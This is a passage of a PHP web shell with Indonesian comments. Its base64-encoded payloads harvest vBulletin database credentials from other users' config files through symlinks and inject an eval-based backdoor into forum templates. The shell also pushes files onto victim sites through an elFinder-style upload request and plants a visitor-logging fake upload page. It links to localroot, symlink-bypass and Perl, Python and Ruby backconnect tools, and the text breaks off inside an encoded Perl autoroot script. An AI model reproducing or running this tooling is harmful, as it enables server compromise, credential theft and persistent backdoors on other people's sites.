aWYgKHN0cnBvcygkd3AxMiwgIjIwMCIpID09IHRydWUpDQp7DQogJGNvbmZpZz0gJHdwMjsNCn0NCmVsc2VpZiAoc3RycG9zKCR3cDEzLCAiMjAwIikgPT0gdHJ1ZSkNCnsNCiAkY29uZmlnPSAkd3AzOw0KfQ0KZWxzZQ0Kew0KY29udGludWU7DQoNCn0NCmZsdXNoKCk7DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KJGRvbSA9ICRkb21zd3NbMV1bMF07DQoNCiR3ID0gZndyaXRlKCRmLCIkY29uZmlnfHwkZG9tIFxuIik7DQppZigkdyl7JHIgPSAnPGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TYXZlPC9iPic7fWVsc2V7JHIgPSAnPGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPic7fQ0KDQoNCmVjaG8gIjx0cj48dGQ+PGEgaHJlZj1odHRwOi8vd3d3LiIuJGRvbXN3c1sxXVswXS4iPiIuJGRvbXN3c1sxXVswXS4iPC9hPjwvdGQ+DQo8dGQ+PGEgaHJlZj0nJGNvbmZpZyc+Y29uZmlnPC9hPjwvdGQ+PHRkPiIuJHIuIjwvdGQ+PC90cj4iOw0KZmx1c2goKTsNCmZsdXNoKCk7DQoNCg0KDQoNCg0KZmx1c2goKTsNCg0KDQp9DQp9DQp9DQp9DQoNCg0KYnJlYWs7DQoNCg0KY2FzZSAndmInOg0KDQoNCmlmKGlzc2V0KCRfUE9TVFsncyddKSl7DQoNCg0KDQokZmlsZSA9IEBmaWxlX2dldF9jb250ZW50cygndmIudHh0Jyk7DQoNCiRleCAgID0gZXhwbG9kZSgiXG4iLCRmaWxlKTsNCg0KZWNobyAiPGRpdiBjbGFzcz0ndG1wJz48dGFibGUgYWxpZ249J2NlbnRlcicgd2lkdGg9JzQwJSc+PHRkPiBkb21pbiA8L3RkPjx0ZD4gY29uZmlnIDwvdGQ+PHRkPiBSZXN1bHQgPC90ZD4iOw0KDQoNCmZvcmVhY2ggKCRleCBhcyAkZXhwKXsNCg0KJGVzICAgPSBleHBsb2RlKCJ8fCIsJGV4cCk7DQoNCiRjb25maWcgPSAkZXNbMF07DQoNCiRkb21pbiA9ICRlc1sxXTsNCg0KJGRvbWlucyA9IHRyaW0oJGRvbWluKS4nJzsNCg0KJHJlYWRjb25maWcgID0gQGZpbGVfZ2V0X2NvbnRlbnRzKHRyaW0oJGNvbmZpZykpOw0KDQppZihlcmVnKCd2QnVsbGV0aW4nLCRyZWFkY29uZmlnKSl7DQoNCg0KDQokZGIgICAgICA9ICBleCgkcmVhZGNvbmZpZywnJGNvbmZpZ1tcJ0RhdGFiYXNlXCddW1wnZGJuYW1lXCddID0gXCcnLCInOyIpOw0KDQokdXNlcmRiICA9ICBleCgkcmVhZGNvbmZpZywnJGNvbmZpZ1tcJ01hc3RlclNlcnZlclwnXVtcJ3VzZXJuYW1lXCddID0gXCcnLCInOyIpOw0KDQokcGFzcyAgICA9ICBleCgkcmVhZGNvbmZpZywnJGNvbmZpZ1tcJ01hc3RlclNlcnZlclwnXVtcJ3Bhc3N3b3JkXCddID0gXCcnLCInOyIpOw0KDQokY29uICAgICA9IEBteXNxbF9jb25uZWN0KCdsb2NhbGhvc3QnLCR1c2VyZGIsJHBhc3MpOw0KDQokZGIgICAgICA9IEBteXNxbF9zZWxlY3RfZGIoJGRiLCRjb24pOw0KDQokc2hlbGwgICA9ICJiVkRQUzhNd0ZMNEwvZyt2WVpBV2RQUGlhVXYxNGtBUUZLcW5VVXFhcGpTWU5LRkp4Q243MzIyYWJnemNJZkR5dmwrUDcvcUtzMDREM3RTNXNKOTZNTUo5YitvaER3OHZUV2NxMzFQRjAyeUpwL1dxenZFYVprMnJCd1dVT2FGN2doQW83anJkRUdTMGRRaDR6OXplY0lLVWwwNFlPcmhWNE44MjFGRUV3WlFnYjZTbURSOFFpT2JzZHhZaGV1TWRSS05XU0g1VXh0bUtuM0crdjBQNVRJeGdOVHFoV1dSOXJZU0xBWEgvUmFVZmdZOHBiVlJPWjRWSTBhYXdxTjVlaS9jZERsUmNBaUZ3SkVJR3Y0SHl5TFRacDR0cSsvenlWT3h3T0FTWE8reVVxVUk2TG0vZ0h4aUJMRGljNm82MlVIakd1TFdRSkVrbzk5VDlHZzdBcGVVWEpGc3E1RVgrQVI3eVB3PT0iIDsNCg0KJGNyeXB0ICA9ICJ7XCR7ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZShcJyI7DQoNCiRjcnlwdCAuPSAiJHNoZWxsIjsNCg0KJGNyeXB0IC49ICJcJykpKX19e1wke2V4aXQoKX19PC90ZXh0YXJlYT4iOw0KDQokc3FsZmFxID0gIlVQREFURSB0ZW1wbGF0ZSBTRVQgdGVtcGxhdGUgPSciLiRjcnlwdC4iJyBXSEVSRSB0aXRsZSA9J0ZBUSciIDsNCg0KJHF1ZXJ5ICA9IEBteXNxbF9xdWVyeSgkc3FsZmFxLCRjb24pOw0KDQoNCg0KaWYgKCRxdWVyeSl7JHIgPSAnPGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TdWNjZWVkPC9iPiBzaGVsbCBpbiBzZWFyY2gucGhwJzt9DQoNCmVsc2UNCg0Kew0KDQokciA9ICc8YiBzdHlsZT0iY29sb3I6cmVkIj5mYWlsZWQ8L2I+JzsNCg0KfQ0KDQokZG9taW5zID0gdHJpbSgkZG9taW4pLicnOw0KDQplY2hvICI8dHI+DQo8dGQ+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2h0dHA6Ly8kZG9taW5zJz4kZG9taW48L2E+PC90ZD4NCjx0ZD48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nJGNvbmZpZyc+Y29uZmlnPC9hPjwvdGQ+PHRkPiIuJHIuIjwvdGQ+PC90cj4iOw0KDQoNCg0KDQoNCg0KDQp9ZWxzZXsNCg0KZWNobyAiPHRyPg0KPHRkPjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdodHRwOi8vJGRvbWlucyc+JGRvbWluPC9hPjwvdGQ+DQo8dGQ+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2h0dHA6Ly8kY29uZmlnJz5jb25maWc8L2E+PC90ZD48dGQ+PGIgc3R5bGU9J2NvbG9yOnJlZCc+ZmFpbGVkMjwvYj48L3RkPjwvdHI+IjsNCn0NCg0KfQ0KDQoNCg0KDQoNCg0KDQoNCg0KDQpkaWUoKTsNCg0KfQ0KDQppZighaXNfZmlsZSgnbmFtZWQudHh0Jykpew0KDQokZDAwbSA9IGZpbGUoIi9ldGMvbmFtZWQuY29uZiIpOw0KDQp9ZWxzZXsNCg0KJGQwMG0gPSBmaWxlKCJuYW1lZC50eHQiKTsNCg0KDQp9DQppZighJGQwMG0pDQp7DQoNCiAgICAgICAgICAgICAgIGRpZSAoIjxtZXRhIGh0dHAtZXF1aXY9J3JlZnJlc2gnIGNvbnRlbnQ9JzA7IHVybD0/c3dzPXJlYWQnLz4iKTsNCn0NCmVsc2UNCg0Kew0KZWNobyAiPGRpdiBjbGFzcz0ndG1wJz4NCjxmb3JtIG1ldGhvZD0nUE9TVCcgYWN0aW9uPSckcGc/c3dzPXZiJz4NCjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdJbmplY3Qgc2hlbGwnIC8+DQo8aW5wdXQgdHlwZT0naGlkZGVuJyB2YWx1ZT0nMScgbmFtZT0ncycgLz4NCjwvZm9ybT4NCjxiciAvPjxiciAvPg0KPHRhYmxlIGFsaWduPSdjZW50ZXInIHdpZHRoPSc0MCUnPjx0ZD4gRG9tYWlucyA8L3RkPjx0ZD4gY29uZmlnIDwvdGQ+PHRkPiBSZXN1bHQgPC90ZD4iOw0KDQokZiA9IGZvcGVuKCd2Yi50eHQnLCd3Jyk7DQoNCmZvcmVhY2goJGQwMG0gYXMgJGRvbSl7DQoNCmlmKGVyZWdpKCJ6b25lIiwkZG9tKSl7DQoNCnByZWdfbWF0Y2hfYWxsKCcjem9uZSAiKC4qKSIjJywgJGRvbSwgJGRvbXN3cyk7DQoNCmlmKHN0cmxlbih0cmltKCRkb21zd3NbMV1bMF0pKSA+IDIpew0KDQokdXNlciA9IHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoIi9ldGMvdmFsaWFzZXMvIi4kZG9tc3dzWzFdWzBdKSk7DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQoNCiR3cGw9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL2luY2x1ZGVzL2NvbmZpZy5waHAiOw0KJHdwcD1nZXRfaGVhZGVycygkd3BsKTsNCiR3cD0kd3BwWzBdOw0KDQokd3AyPSRwYWdlVVJMLiIvc3ltL3Jvb3QvaG9tZS8iLiR1c2VyWyduYW1lJ10uIi92Yi9pbmNsdWRlcy9jb25maWcucGhwIjsNCiR3cHAyPWdldF9oZWFkZXJzKCR3cDIpOw0KJHdwMTI9JHdwcDJbMF07DQoNCiR3cDM9JHBhZ2VVUkwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXJbJ25hbWUnXS4iL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAiOw0KJHdwcDM9Z2V0X2hlYWRlcnMoJHdwMyk7DQokd3AxMz0kd3BwM1swXTsNCg0KDQovLy8vLy8vLy8vIHZiIC8vLy8vLy8vLy8vLw0KDQokcG9zID0gc3RycG9zKCR3cCwgIjIwMCIpOw0KJGNvbmZpZz0iJm5ic3A7IjsNCg0KaWYgKHN0cnBvcygkd3AsICIyMDAiKSA9PSB0cnVlICkNCnsNCiRjb25maWc9ICR3cGw7DQp9DQplbHNlaWYgKHN0cnBvcygkd3AxMiwgIjIwMCIpID09IHRydWUpDQp7DQogJGNvbmZpZz0gJHdwMjsNCn0NCmVsc2VpZiAoc3RycG9zKCR3cDEzLCAiMjAwIikgPT0gdHJ1ZSkNCnsNCiAkY29uZmlnPSAkd3AzOw0KfQ0KZWxzZQ0Kew0KY29udGludWU7DQoNCn0NCmZsdXNoKCk7DQoNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KJGRvbSA9ICRkb21zd3NbMV1bMF07DQoNCiR3ID0gZndyaXRlKCRmLCIkY29uZmlnfHwkZG9tIFxuIik7DQppZigkdyl7JHIgPSAnPGIgc3R5bGU9ImNvbG9yOiAjMDA2NjAwIj5TYXZlPC9iPic7fWVsc2V7JHIgPSAnPGIgc3R5bGU9ImNvbG9yOnJlZCI+ZmFpbGVkPC9iPic7fQ0KDQoNCmVjaG8gIjx0cj48dGQ+PGEgaHJlZj1odHRwOi8vd3d3LiIuJGRvbXN3c1sxXVswXS4iPiIuJGRvbXN3c1sxXVswXS4iPC9hPjwvdGQ+DQo8dGQ+PGEgaHJlZj0nJGNvbmZpZyc+Y29uZmlnPC9hPjwvdGQ+PHRkPiIuJHIuIjwvdGQ+PC90cj4iOw0KDQoNCg0KDQoNCmZsdXNoKCk7DQoNCg0KfQ0KfQ0KfQ0KfQ0KDQoNCg0KDQoNCg0KDQoNCmJyZWFrOw0KDQpjYXNlICdoZWxwJzoNCg0KZWNobyAiPGRpdiBjbGFzcz0ndG1wJz4NCjx0YWJsZSBhbGlnbj0nY2VudGVyJyB3aWR0aD0nNDAlJz48dGQ+ZnVuY3Rpb248L3RkPjx0ZD5DYXNlPC90ZD4iOw0KDQoNCiRzYWZlX21vZGUgPSBpbmlfZ2V0KCdzYWZlX21vZGUnKTsNCiAgICBpZigkc2FmZV9tb2RlKXskciA9ICI8YiBzdHlsZT0nY29sb3I6IHJlZCc+RmFsc2U8L2I+Ijt9ZWxzZXskciA9ICI8YiBzdHlsZT0nY29sb3I6ICMzMzY2MDAnPlRydWU8L2I+Ijt9DQoNCmVjaG8gIjx0cj48dGQ+U2FmZSBNb2RlPC90ZD48dGQ+JHI8L3RkPiI7DQoNCiRmdW4gPSBmdW5jdGlvbl9leGlzdHMoJ3N5bWxpbmsnKTsNCiAgICBpZighJGZ1bil7JHIgPSAiPGIgc3R5bGU9J2NvbG9yOiByZWQnPkZhbHNlPC9iPiI7fWVsc2V7JHIgPSAiPGIgc3R5bGU9J2NvbG9yOiAjMzM2NjAwJz5UcnVlPC9iPiI7fQ0KDQplY2hvICI8dHI+PHRkPmZ1bmN0aW9uIHN5bWxpbms8L3RkPjx0ZD4kcjwvdGQ+IjsNCg0KDQokZnVuID0gZnVuY3Rpb25fZXhpc3RzKCdmaWxlJyk7DQogICAgaWYoISRmdW4peyRyID0gIjxiIHN0eWxlPSdjb2xvcjogcmVkJz5GYWxzZTwvYj4iO31lbHNleyRyID0gIjxiIHN0eWxlPSdjb2xvcjogIzMzNjYwMCc+VHJ1ZTwvYj4iO30NCg0KZWNobyAiPHRyPjx0ZD5mdW5jdGlvbiBmaWxlPC90ZD48dGQ+JHI8L3RkPiI7DQoNCiRmdW4gPSBmdW5jdGlvbl9leGlzdHMoJ2ZpbGVfZ2V0X2NvbnRlbnRzJyk7DQogICAgaWYoISRmdW4peyRyID0gIjxiIHN0eWxlPSdjb2xvcjogcmVkJz5GYWxzZTwvYj4iO31lbHNleyRyID0gIjxiIHN0eWxlPSdjb2xvcjogIzMzNjYwMCc+VHJ1ZTwvYj4iO30NCg0KZWNobyAiPHRyPjx0ZD5mdW5jdGlvbiBmaWxlX2dldF9jb250ZW50czwvdGQ+PHRkPiRyPC90ZD4iOw0KDQokZnVuID0gZnVuY3Rpb25fZXhpc3RzKCdta2RpcicpOw0KICAgIGlmKCEkZnVuKXskciA9ICI8YiBzdHlsZT0nY29sb3I6IHJlZCc+RmFsc2U8L2I+Ijt9ZWxzZXskciA9ICI8YiBzdHlsZT0nY29sb3I6ICMzMzY2MDAnPlRydWU8L2I+Ijt9DQoNCmVjaG8gIjx0cj48dGQ+ZnVuY3Rpb24gbWtkaXI8L3RkPjx0ZD4kcjwvdGQ+IjsNCg0KDQokZnVuID0gaXNfZGlyKCdzeW0vcm9vdCcpOw0KICAgIGlmKCEkZnVuKXskciA9ICI8YiBzdHlsZT0nY29sb3I6IHJlZCc+RmFsc2U8L2I+Ijt9ZWxzZXskciA9ICI8YiBzdHlsZT0nY29sb3I6ICMzMzY2MDAnPlRydWU8L2I+Ijt9DQoNCmVjaG8gIjx0cj48dGQ+UGVybWlzc2lvbiBkZW5pZWQ8L3RkPjx0ZD4kcjwvdGQ+IjsNCg0KDQokZnVuID0gcHJlZ19tYXRjaCgnL0ZvcmJpZGRlbi8nLEBmaWxlX2dldF9jb250ZW50cygnc3ltL3Jvb3QnKSBvciAhQGZpbGVfZ2V0X2NvbnRlbnRzKCdzeW0vcm9vdCcpKTsNCiAgICBpZigkZnVuKXskciA9ICI8YiBzdHlsZT0nY29sb3I6IHJlZCc+RmFsc2U8L2I+Ijt9ZWxzZXskciA9ICI8YiBzdHlsZT0nY29sb3I6ICMwMDY2MDAnPlRydWU8L2I+Ijt9DQoNCmVjaG8gIjx0cj48dGQ+Rm9yYmlkZGVuPC90ZD48dGQ+JHI8L3RkPiI7DQoNCg0KDQoNCmVjaG8gIjwvdGFibGU+PC9kaXY+IjsNCg0KDQoNCmJyZWFrOw0KZGVmYXVsdDoNCmhlYWRlcigiTG9jYXRpb246ICRwZyIpOw0KDQoNCg0KDQp9DQoNCg0KLy8vIGhvbWUgLy8vDQp9ZWxzZQ0Kew0KDQoNCmVjaG8gJzxiciAvPjxiciAvPjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgdmFsdWU9IkNob29zZSBmaWxlIiBzaXplPSI2MCIgPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsNCmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsNCiAgICBpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICc8YnIgLz48YnIgLz48Yj5VcGxvYWRlZCBzdWNjZXNzZnVsICEhPGJyPjxicj4nOyB9DQogICAgZWxzZSB7IGVjaG8gJzxiciAvPjxiciAvPk5vdCB1cGxvYWRlZCAhITxicj48YnI+JzsgfQ0KDQoNCn0NCg0KICAgZWNobyAnDQo8YnIgLz48YnIgLz48YnIgLz48L2I+PC9iPjxkaXYgY2xhc3M9ImZvdCI+Q29kM2QgYnkgPGI+UzNuNHQwMHI8L2I+IElkZWEgYnkgPGI+TXIuQWxzYTNlazwvYj4NCjxiciAvPjxiciAvPg0KPGIgc3R5bGU9ImNvbG9yOiByZWQiOz4gICBTZWMtdy5Db20gIDwvYj4NCjxiciAvPjxiciAvPg0KTXVzbGltcyBIYWNrZXJzPC9kaXY+ICc7DQoNCn0NCg0KDQpmdW5jdGlvbiBleCgkdGV4dCwkYSwkYil7DQokZXhwbG9kZSA9IGV4cGxvZGUoJGEsJHRleHQpOw0KJGV4cGxvZGUgPSBleHBsb2RlKCRiLCRleHBsb2RlWzFdKTsNCnJldHVybiAkZXhwbG9kZVswXTsNCn0NCg0KDQoNCmVjaG8gJzwvZGl2Pg0KDQo8YSBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lOyBjb2xvcjogI0Y0RjRGNDsiIHRpdGxlPSI/wqc/4oCeP8KtP+KApj/Cpz8/P+KAoSIvaHJlZj0iaHR0cDovL3NlYy13LmNvbS9jYyI+P8KnP+KAnj/CrT/igKY/wqc/Pz/igKE8L2E+DQoNCjxhIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmU7IGNvbG9yOiAjRjRGNEY0OyIgdGl0bGU9Ij8/P8KnP+KAnj/igKYgP8KnP+KAnj/CrT/igKY/wqc/Pz/igKEiL2hyZWY9Imh0dHA6Ly9zZWMtdy5jb20vY2MiPj8/P8KnP+KAnj/igKYgP8KnP+KAnj/CrT/igKY/wqc/Pz/igKE8L2E+DQoNCg0KDQo8L2JvZHk+DQoNCjwvaHRtbD4NCic7DQoNCj8+DQo=";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done Symlink Sa. 3.0 (sym.php) berhasil di tanam coba cek<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}

} elseif($_GET['do'] == 'ph') { ?>
<br>
<h2><font color = "white">Plant A Trap And Troll The Lamers</font><br></h2>
<img src=http://static4.fjcdn.com/comments/Sakurasou+no+pet+na+kanojo+_6c7aba272337e34d5d7ed91fcb2281bf.jpg height=250 width=400 >
<br>
<br><h2><font color = "white">Honeypot adalah jebakan dalam bentuk bug palsu untuk menjebak hacker</font><br></h2>
<form method="post">
<input type="submit" name="aa" value="PLANT Fake Arbitrary Upload Honeypot">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['aa']) {
	foreach($target as $korban) {
		$global = "upload.php";
		$isi_nama_doang = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjx0aXRsZT5GaWxlIFVwbG9hZDwvdGl0bGU+DQo8Ym9keT4NCjxmb3JtIGFjdGlvbj0icHJvY2Vzcy5waHAiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+DQpTZWxlY3QgaW1hZ2UgdG8gdXBsb2FkOg0KPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVUb1VwbG9hZCIgaWQ9ImZpbGVUb1VwbG9hZCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIGZpbGUiIG5hbWU9InN1Ym1pdCI+DQo8L2Zvcm0+DQo8L2JvZHk+DQo8L2h0bWw+DQoNCg0KPD9waHANCi8vIExpdGUgRmFrZSBBcmJpdHJhcnkgRmlsZSBVcGxvYWQgSG9uZXlwb3QNCi8vIENvZGVkIGJ5IFl1a2lub3NoaXRhIDQ3DQovLyBOb3cgSXQncyBTbyBTaW1wbGUgRm9yIENhdGNoaW5nIE5vb2JzIGFuZCBMYW1lcnMgOnANCiRwcm90b2NvbCA9ICRfU0VSVkVSWydTRVJWRVJfUFJPVE9DT0wnXTsNCiRpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddOw0KJHBvcnQgPSAkX1NFUlZFUlsnUkVNT1RFX1BPUlQnXTsNCiRhZ2VudCA9ICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCiRyZWYgPSAkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107DQokY29va2llID0gJF9TRVJWRVJbJ1FVRVJZX1NUUklORyddOw0KJHJxc3RfbWV0aG9kID0gJF9TRVJWRVJbJ01FVEhPRCddOw0KJGhvc3RuYW1lID0gZ2V0aG9zdGJ5YWRkcigkX1NFUlZFUlsnUkVNT1RFX0FERFInXSk7DQokZmggPSBmb3BlbignbG9nLnR4dCcsICdhJyk7DQpmd3JpdGUoJGZoLCAnPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScuIlxuIik7DQpmd3JpdGUoJGZoLCAnIFRISVMgSEFDS0VSIFdBTlQgVE8gVFJZIEhBQ0sgWU9VUiBTSVRFJy4iXG4iKTsNCmZ3cml0ZSgkZmgsICc9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Jy4iXG4iKTsNCmZ3cml0ZSgkZmgsICdJUCBBZGRyZXNzOiAnLiIiLiRpcCAuIlxuIik7DQpmd3JpdGUoJGZoLCAnSG9zdG5hbWU6ICcuIiIuJGhvc3RuYW1lIC4iXG4iKTsNCmZ3cml0ZSgkZmgsICdQb3J0IE51bWJlcjogJy4iIi4kcG9ydCAuIlxuIik7DQpmd3JpdGUoJGZoLCAnVXNlciBBZ2VudDogJy4iIi4kYWdlbnQgLiJcbiIpOw0KZndyaXRlKCRmaCwgJ0hUVFAgUmVmZXJlcjogJy4iIi4kcmVmIC4iXG5cbiIpOw0KZndyaXRlKCRmaCwgJ0Nvb2tpZTogJy4iIi4kY29va2llIC4iXG5cbiIpOw0KZndyaXRlKCRmaCwgJ01ldGhvZDogJy4iIi4kcnFzdF9tZXRob2QgLiJcblxuIik7DQpmd3JpdGUoJGZoLCAnPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PScuIlxuIik7DQpmd3JpdGUoJGZoLCAnIE1BWUJFIFRIRVkgQVJFIFBMQVkgSU4gV1JPTkcgUExBQ0UgJy4iXG4iKTsNCmZ3cml0ZSgkZmgsICc9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Jy4iXG4iKTsNCmZjbG9zZSgkZmgpOw0KPz4gDQo=";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done Fake Arbitrary Upload Honeypot (upload.php) berhasil di tanam tinggal nunggu siapa kejebak wkwkwkwkwk<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
//sesuatu yang lain
} elseif($_GET['do'] == 'se') { ?>
<?php
echo"<center><h1>Other 'Priv9' Feature in This Shells</h1><br>
<img src=http://pa1.narvii.com/5715/a22d23136a6e6c2f3d61588d07ad73f0835531a0_hq.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=w00ts'>Localroot Exploiter</a><br><br>";
echo "<a href='?dir=$dir&do=masy'>Manual Symlink</a><br><br>";
echo "<a href='?dir=$dir&do=manu'>Manual Retrieve Config </a><br><br>";
echo "<a href='?dir=$dir&do=ensim'>Enable Symlink If Disabled </a><br><br>";
echo "<a href='?dir=$dir&do=sybas14'>Symlink Bypass 2014 </a><br><br>";
echo "<a href='?dir=$dir&do=cari'>Find Directory Writable/Readable </a><br><br>";
echo "<a href='?dir=$dir&do=subdomainchkrezes'>Subdomain Checker</a><br><br>";
echo "<a href='?dir=$dir&do=beko'>Backconnect Simple</a><br><br>";
echo "<a href='?dir=$dir&do=rubybckconnnect'>Ruby BackConnect</a><br><br>";
echo "<a href='?dir=$dir&do=prlbckacnonect'>Perl BackConnect</a><br><br>";
echo "<a href='?dir=$dir&do=pythnonbakcncete'>Python BackConnect</a><br><br>";
echo "<a href='?dir=$dir&do=tesexploit'>Tes Exploit</a><br><br>";

} elseif($_GET['do'] == 'w00ts') { ?>
<?
{
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Autoroot Generator Coded By Mauritania Attacker</span><center><br>';
echo'<center><font color="#006600" size="2pt"><b>Special Greet To HusseiN98D</b><font/></center><br>';
echo"<p align='center'> <img border='0' src='https://s-media-cache-ak0.pinimg.com/564x/47/e0/25/47e02545ad7b645485c751e26303d320.jpg'>";
echo'<div class="tul"><font color="007700" face="Geneva, sans-serif" style="font-size: 11pt"><font/>';


@error_reporting(0);

sleep(2);

echo "<p><b>Script Autoroot Perl Extracted Successfully.... \!/ </b></p><br>";
//generate autoroot script perl
mkdir('lulZ',0755);
$shellw0rm = 'cHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0KcHJpbnQgIiAgICAgICAgIEFub25HaG9zdCBTbTRzaCBhdXRvIHIwMHQgICAgICAgICAgXG4iOw0KcHJpbnQgIiAgICAgICAgICAgICAgICAgMjAwNSAtIDIwMTMgICAgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIiAgICAgX19fX19fXyAgX19fX19fXyAgX19fX19fXyBfX19fX19fX18gICAgXG4iOw0KcHJpbnQgIiAgICAoICBfX19fICkoICBfXyAgICkoICBfXyAgIClcX18gICBfXy8gICAgXG4iOw0KcHJpbnQgIiAgICB8ICggICAgKXx8ICggICkgIHx8ICggICkgIHwgICApICggICAgICAgXG4iOw0KcHJpbnQgIiAgICB8IChfX19fKXx8IHwgLyAgIHx8IHwgLyAgIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8ICAgICBfXyl8ICgvIC8pIHx8ICgvIC8pIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8IChcICggICB8ICAgLyB8IHx8ICAgLyB8IHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8ICkgXCBcX198ICAoX18pIHx8ICAoX18pIHwgICB8IHwgICAgICAgXG4iOw0KcHJpbnQgIiAgICB8LyAgIFxfXy8oX19fX19fXykoX19fX19fXykgICApXyggICAgICAgXG4iOw0KcHJpbnQgIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJCSAgIENvZGVkIGJ5IEh1c3NlaU45OEQgICAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJCQkgICAgIDE5LzA4LzIwMTQJCSAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IGxpbnV4ICwgcGVybCAkMCBsbnggICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IEJzZCAsICBwZXJsICQwIGJzZCAgICAgICAgICAgXG4iOw0KcHJpbnQgIgkJICBUbyByb290IFN1bk9TICwgcGVybCAkMCBzdW5vcyAgICAgICAgXG4iOw0KcHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOw0KDQoNCmlmICgkQVJHVlswXSA9fiAibG54IiApDQp7DQpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsNCnByaW50ICIjIExpbnV4L0JzZC9TdW5vcyBBVVRPLVJPT1RFUiAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICBIYXZlIGEgY29mZmUgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsNCnByaW50ICIjICAgICAgIFJvb3RpbmcgbGludXggICAgICAgICAgI1xuIjsNCnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4